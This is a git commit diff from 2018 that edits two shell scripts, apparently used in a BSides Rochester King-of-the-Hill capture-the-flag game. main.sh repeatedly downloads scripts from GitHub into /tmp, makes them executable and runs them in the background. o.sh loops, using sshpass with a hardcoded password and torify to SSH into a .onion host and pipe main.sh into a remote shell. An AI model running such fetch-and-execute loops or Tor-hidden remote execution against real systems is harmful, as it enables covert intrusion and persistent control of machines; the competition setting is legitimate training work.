0ec32bcc9f3b8e757ce6cc03c803e6fb7400a645
baa7968 <baa7968@rit.edu>
2018-04-13 18:42:54 -0400

    update

--- main.sh
+++ main.sh
@@ -4,8 +4,7 @@ do
 	wget -O /tmp/one.sh https://raw.githubusercontent.com/ckt29175/ctf2018-bisdesroc/master/one.sh  
 	wget -O /tmp/two.sh https://raw.githubusercontent.com/bd3r/BsidesRochesterKOTH/master/changeImage.sh
 	sleep 1
-	chmod +x /tmp/one.sh
-	chmod +x /tmp/two.sh
-	/tmp/one.sh & /tmp/two.sh
+	chmod +x /tmp/one.sh & chmod +x /tmp/two.sh 
+	/tmp/one.sh & /tmp/two.sh &
 	sleep 310
 done
--- o.sh
+++ o.sh
@@ -1,7 +1,7 @@
 #!/bin/bash
 while :
 do
-	sshpass -p "koth" torify ssh koth@446oq64f55zaz4qu.onion 'bash -s' < /home/bdr/bsides/main.sh &
+	sshpass -p "koth" torify ssh koth@446oq64f55zaz4qu.onion 'bash -s' < /home/bdr/bsides/main.sh
 	sleep 900
 	exit
 done
